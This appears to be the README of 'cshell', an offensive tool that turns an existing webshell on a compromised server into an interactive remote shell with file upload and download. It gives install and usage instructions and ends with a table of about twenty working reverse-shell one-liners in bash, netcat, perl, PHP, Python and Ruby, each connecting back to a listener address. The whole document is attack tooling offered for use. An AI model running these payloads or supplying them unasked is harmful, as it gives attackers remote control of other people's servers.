# CSHELL  
***  
[![PyPI version fury.io](https://badge.fury.io/py/ansicolortags.svg)](https://pypi.python.org/pypi/cshell/)  [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/0z09e/cshell/LICENSE)  
  
***  
This script takes a working webshell as an argument and can perform the following operations  
- rev : This option sends a payload according to your choice and triggers that payload on the target webshell<br\>  
- web : This parameter can execute direct command on the webshell using persisted working directory and error message<br/>  
- lstnr : This option generates a payload and copies it to the clipboard. It can also start a listener, and also encodes the payload [Both are Optional]  
  
## Install  
- From PIP library :   
  ```  
  pip3 install cshell  
  ```  
- From Github :   
  ```  
  git clone https://github.com/0z09e/cshell.git  
  cd cshell  
  sudo python3 setup.py install  
  ```  
    
### Usage  
- **Help Menu :**  
``` 
$ cshell --help  
usage: cshell.py [-h] [--payloads] {rev,web,lstnr} ...  
  
positional arguments:  
  {rev,web,lstnr}  
  
optional arguments:  
  -h, --help       show this help message and exit  
  --payloads       List all payload formats for rev  
  
web     Direct command execution on the webshell with error message  
rev     Reverse shell from a working webshell  
lstnr   Generate payload, copy it to your clipboard and start a listener[Optional]  
```

- **Getting a reverse shell from a webshell :**   
	- GET Method  : `cshell rev -i <Interface or IP> <Target URL with REV as command>`  
	- POST Method : `cshell rev -i <Interface or IP> -m POST -d <Post DATA in JSON format with REV as command> <Target URL>`  
- **Interacting with a webshell** :   
	- GET Method : `cshell web <Target URL with WEB as command>`  
	- Post Method : `cshell rev -m POST -d <Post DATA in JSON format with WEB as command> <Target URL>`  
- **Generating a payload** :   
	- `cshell lstnr -f <Format> -i <Interface or IP>  -p <Port> -f <Payload format>`  
  

### Custom Commands : 
- `help` - Help menu of custom commands  
- `clear` - Clear the screen  
- `exit` - Exit the shell  
- `upload` - Upload a file into the remote server  
- `download` - Download a file from the remote server  


### Payloads  
```
$ cshell --payloads  
========================================================================================================  
Format-Name                     Payload  
========================================================================================================  
bash-196                        0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196  
bash                            bash -i >& /dev/tcp/127.0.0.1/1337 0>&1  
bash-read-line                  exec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done  
bash-5                          bash -i 5<> /dev/tcp/127.0.0.1/1337 0<&5 1>&5 2>&5  
bash-udp                        bash -i >& /dev/udp/127.0.0.1/1337 0>&1  
nc-mkfifo                       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 1337 >/tmp/f  
nc                              nc -e /bin/bash 127.0.0.1 1337  
nc-c                            nc -c /bin/bash 127.0.0.1 1337  
ncat-e                          ncat 127.0.0.1 1337 -e /bin/bash  
perl                            perl -e 'use Socket;$i="127.0.0.1";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'  
php-exec                        php -r '$sock=fsockopen("127.0.0.1",1337);exec("bash <&3 >&3 2>&3");'  
php-shell-exec                  php -r '$sock=fsockopen("127.0.0.1",1337);shell_exec("bash <&3 >&3 2>&3");'  
php-system                      php -r '$sock=fsockopen("127.0.0.1",1337);system("bash <&3 >&3 2>&3");'  
php-passthru                    php -r '$sock=fsockopen("127.0.0.1",1337);passthru("bash <&3 >&3 2>&3");'  
php-popen                       php -r '$sock=fsockopen("127.0.0.1",1337);popen("bash <&3 >&3 2>&3", "r");'  
python                          python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'  
python-export                   export RHOST="127.0.0.1";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'  
python3                         python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'  
python3-export                  export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")  
ruby                            export RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'  
```  


